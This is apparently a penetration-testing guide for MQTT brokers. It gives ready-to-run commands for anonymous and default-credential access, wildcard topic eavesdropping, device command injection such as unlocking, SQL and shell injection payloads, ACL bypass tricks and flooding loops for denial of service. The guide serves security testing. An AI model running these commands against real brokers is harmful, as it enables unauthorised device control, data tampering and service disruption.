<mqtt_protocol_guide>
<title>MQTT PROTOCOL SECURITY TESTING</title>

<critical>MQTT (Message Queuing Telemetry Transport) is a lightweight messaging protocol widely used in IoT, industrial systems, and real-time applications. Security vulnerabilities include unauthenticated access, topic injection, message manipulation, and broker misconfiguration. Many MQTT deployments lack basic security controls.</critical>

<scope>
- Broker authentication bypass
- Topic enumeration and subscription
- Message injection and manipulation
- Authorization and ACL bypass
- Retained message exploitation
- Will message abuse
- Protocol-level attacks (MQTT 3.1.1 vs 5.0)
- TLS/SSL configuration issues
</scope>

<methodology>
1. Identify MQTT broker and version.
2. Test for unauthenticated access.
3. Enumerate topics through wildcard subscriptions.
4. Probe for message injection and manipulation.
5. Test authorization controls on topics.
</methodology>

<protocol_basics>
<mqtt_structure>
{% raw %}
# MQTT Connection:
# Client connects to broker on port 1883 (plain) or 8883 (TLS)

# Key concepts:
# - Topics: Hierarchical paths (e.g., home/sensor/temperature)
# - Publish: Send message to topic
# - Subscribe: Receive messages from topic
# - QoS: Quality of Service (0, 1, 2)
# - Retained: Last message kept by broker
# - Will: Message sent when client disconnects unexpectedly

# Wildcards:
# + : Single level (home/+/temperature matches home/bedroom/temperature)
# # : Multi level (home/# matches home/bedroom/sensor/temperature)
{% endraw %}
</mqtt_structure>

<connection_packet>
{% raw %}
# CONNECT packet components:
- Protocol Name: "MQTT"
- Protocol Level: 4 (MQTT 3.1.1) or 5 (MQTT 5.0)
- Clean Session: true/false
- Will Flag, QoS, Retain
- Username/Password flags
- Keep Alive: seconds
- Client ID: unique identifier
- Will Topic/Message (if Will Flag set)
- Username/Password (if flags set)
{% endraw %}
</connection_packet>
</protocol_basics>

<reconnaissance>
<broker_discovery>
{% raw %}
# Default ports:
1883  # MQTT (unencrypted)
8883  # MQTT over TLS
8083  # MQTT over WebSocket
8084  # MQTT over WSS

# Network scanning:
nmap -p 1883,8883,8083,8084 -sV target.com

# Shodan queries:
port:1883 mqtt
product:mosquitto
mqtt country:US

# Common brokers:
# - Mosquitto
# - EMQX
# - HiveMQ
# - AWS IoT Core
# - Azure IoT Hub
{% endraw %}
</broker_discovery>

<broker_identification>
{% raw %}
# Connect and analyze CONNACK:
mosquitto_sub -h target.com -p 1883 -t '#' -v

# Error messages reveal broker type:
# - Mosquitto error formats
# - EMQX error formats
# - Commercial broker signatures

# Check for broker info topic:
mosquitto_sub -h target.com -t '$SYS/#' -v
# $SYS topics contain broker metrics and info
{% endraw %}
</broker_identification>
</reconnaissance>

<unauthenticated_access>
<anonymous_connection>
{% raw %}
# Test anonymous connection:
mosquitto_sub -h target.com -p 1883 -t '#' -v

# If successful, broker allows anonymous access

# Python test:
import paho.mqtt.client as mqtt
client = mqtt.Client()
client.connect("target.com", 1883)
# No username/password = anonymous
{% endraw %}
</anonymous_connection>

<weak_credentials>
{% raw %}
# Common weak credentials:
mosquitto_sub -h target.com -u admin -P admin -t '#'
mosquitto_sub -h target.com -u mqtt -P mqtt -t '#'
mosquitto_sub -h target.com -u guest -P guest -t '#'
mosquitto_sub -h target.com -u user -P password -t '#'

# Default credentials by broker:
# Mosquitto: anonymous by default
# EMQX: admin/public
# HiveMQ: varies by installation
{% endraw %}
</weak_credentials>
</unauthenticated_access>

<topic_enumeration>
<wildcard_subscription>
{% raw %}
# Subscribe to all topics:
mosquitto_sub -h target.com -t '#' -v

# Subscribe to all topics under path:
mosquitto_sub -h target.com -t 'home/#' -v

# Single-level wildcard:
mosquitto_sub -h target.com -t '+/sensor/+' -v

# System topics (broker info):
mosquitto_sub -h target.com -t '$SYS/#' -v
{% endraw %}
</wildcard_subscription>

<topic_discovery>
{% raw %}
# Common topic patterns:
/devices/{device_id}/telemetry
/sensors/{sensor_type}/data
/home/{room}/{device}
/commands/{device_id}
/status/{device_id}
/config/{device_id}
/firmware/{device_id}

# Sensitive topics:
/credentials/*
/auth/*
/admin/*
/debug/*
/internal/*
{% endraw %}
</topic_discovery>

<sys_topics>
{% raw %}
# $SYS broker information topics:
$SYS/broker/version
$SYS/broker/uptime
$SYS/broker/clients/connected
$SYS/broker/clients/total
$SYS/broker/messages/received
$SYS/broker/messages/sent
$SYS/broker/subscriptions/count
$SYS/broker/load/messages/received/1min
{% endraw %}
</sys_topics>
</topic_enumeration>

<message_injection>
<publish_attacks>
{% raw %}
# Inject commands to devices:
mosquitto_pub -h target.com -t 'device/123/command' -m '{"action": "unlock"}'

# Inject false sensor data:
mosquitto_pub -h target.com -t 'sensor/temperature' -m '{"value": 999}'

# Inject to admin topics:
mosquitto_pub -h target.com -t 'admin/config' -m '{"debug": true}'

# Retained message injection (persists until overwritten):
mosquitto_pub -h target.com -t 'topic' -m 'malicious' -r
{% endraw %}
</publish_attacks>

<payload_attacks>
{% raw %}
# Malformed payloads:
mosquitto_pub -h target.com -t 'device/cmd' -m '{invalid json}'

# Oversized payloads (DoS):
mosquitto_pub -h target.com -t 'topic' -m "$(python -c 'print("A"*1000000)')"

# Injection in JSON payload:
mosquitto_pub -h target.com -t 'api/query' -m '{"query": "'; DROP TABLE--"}'

# Command injection:
mosquitto_pub -h target.com -t 'device/exec' -m '$(id)'
{% endraw %}
</payload_attacks>
</message_injection>

<will_message_abuse>
<will_exploitation>
{% raw %}
# Will message: sent when client disconnects unexpectedly

# Set malicious will message:
import paho.mqtt.client as mqtt
client = mqtt.Client()
client.will_set("status/device123", "offline", qos=1, retain=True)
# Will message published if connection drops

# Abuse scenarios:
# 1. Set will to high-priority alert topic
# 2. Inject false status updates
# 3. Trigger automated responses

# DoS via will message spam:
# Connect many clients with wills, disconnect all
{% endraw %}
</will_exploitation>
</will_message_abuse>

<authorization_bypass>
<acl_testing>
{% raw %}
# Test topic ACL restrictions:

# Subscribe to restricted topic:
mosquitto_sub -h target.com -u user1 -P pass1 -t 'admin/#'
# Check if subscription denied

# Publish to restricted topic:
mosquitto_pub -h target.com -u user1 -P pass1 -t 'admin/config' -m 'test'
# Check if publish denied

# ACL bypass attempts:
# - Case variations: Admin/config vs admin/config
# - Unicode normalization
# - Path traversal: ../admin/config
{% endraw %}
</acl_testing>

<topic_confusion>
{% raw %}
# Topic name manipulation:
# Null byte injection:
topic\x00/hidden
admin\x00bypass

# Unicode tricks:
admin/config  vs  аdmin/config (Cyrillic 'а')

# Path separator confusion:
admin/config vs admin//config vs admin/./config

# Wildcard in publish (if allowed):
mosquitto_pub -t '+' -m 'broadcast'
{% endraw %}
</topic_confusion>
</authorization_bypass>

<mqtt_5_features>
<mqtt5_attacks>
{% raw %}
# MQTT 5.0 specific features:

# User Properties:
# Can inject arbitrary metadata
client.publish("topic", "msg", properties={"user": "admin"})

# Content Type manipulation:
# Mislead consumers about payload format

# Response Topic:
# Redirect responses to attacker-controlled topic

# Subscription Identifiers:
# Manipulate message routing

# Topic Aliases:
# Confuse topic resolution
{% endraw %}
</mqtt5_attacks>
</mqtt_5_features>

<denial_of_service>
<dos_attacks>
{% raw %}
# Connection exhaustion:
for i in range(10000):
    client = mqtt.Client(f"client_{i}")
    client.connect("target.com")

# Message flooding:
while True:
    client.publish("topic", "A" * 1000000)

# Subscription overload:
for i in range(10000):
    client.subscribe(f"topic/{i}/#")

# Retained message spam:
for i in range(10000):
    client.publish(f"spam/{i}", "retained", retain=True)
{% endraw %}
</dos_attacks>
</denial_of_service>

<tls_issues>
<tls_testing>
{% raw %}
# Test TLS configuration:

# Check for plain MQTT (no TLS):
mosquitto_sub -h target.com -p 1883 -t '#'

# Check certificate validation:
mosquitto_sub -h target.com -p 8883 --cafile /dev/null -t '#'
# Should fail if properly configured

# Test with self-signed cert:
mosquitto_sub -h target.com -p 8883 --insecure -t '#'

# Check for TLS downgrade:
# Offer weak ciphers and check acceptance
{% endraw %}
</tls_testing>
</tls_issues>

<common_payloads>
{% raw %}
# Anonymous subscription:
mosquitto_sub -h target.com -t '#' -v

# Topic enumeration:
mosquitto_sub -h target.com -t '$SYS/#' -v

# Message injection:
mosquitto_pub -h target.com -t 'device/cmd' -m '{"action": "malicious"}'

# Retained message:
mosquitto_pub -h target.com -t 'topic' -m 'persistent' -r

# ACL bypass:
mosquitto_sub -h target.com -t '../admin/#' -v
{% endraw %}
</common_payloads>

<validation>
1. Demonstrate unauthenticated access with topic subscription.
2. Show message injection affecting device behavior.
3. Prove topic enumeration revealing sensitive information.
4. Document ACL bypass for restricted topic access.
5. Provide evidence of broker configuration exposure via $SYS topics.
</validation>

<false_positives>
- Broker requires strong authentication
- ACLs properly configured per user/topic
- TLS enforced with certificate validation
- Wildcard subscriptions blocked
- $SYS topics restricted
</false_positives>

<impact>
- Unauthorized access to IoT device communications
- Device control through command injection
- Sensor data manipulation
- Privacy breach through message interception
- Industrial system compromise
- Infrastructure sabotage
- Denial of service
</impact>

<pro_tips>
1. Always test for anonymous access first.
2. Wildcard '#' subscription reveals all traffic.
3. $SYS topics expose broker internals.
4. Retained messages persist and affect new subscribers.
5. Will messages can trigger on controlled disconnection.
6. IoT deployments often lack authentication.
7. Topic names may contain sensitive information.
8. MQTT 5.0 has additional attack vectors via properties.
9. WebSocket MQTT may have different security than raw MQTT.
10. Check for both 1883 (plain) and 8883 (TLS) ports.
</pro_tips>

<remember>MQTT security is often neglected in IoT deployments. Unauthenticated brokers expose all message traffic to any subscriber. Topic-based authorization is frequently misconfigured or absent. Always test wildcard subscriptions and message injection capabilities.</remember>
</mqtt_protocol_guide>
